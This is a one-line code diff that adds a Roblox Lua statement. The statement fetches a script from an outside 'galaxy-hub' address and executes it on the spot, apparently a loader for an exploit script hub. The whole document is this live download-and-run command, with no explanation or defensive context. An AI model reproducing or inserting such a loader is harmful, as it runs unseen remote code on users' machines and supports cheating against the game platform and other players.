@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('http://galaxy-hub.gay/whitelist'))()
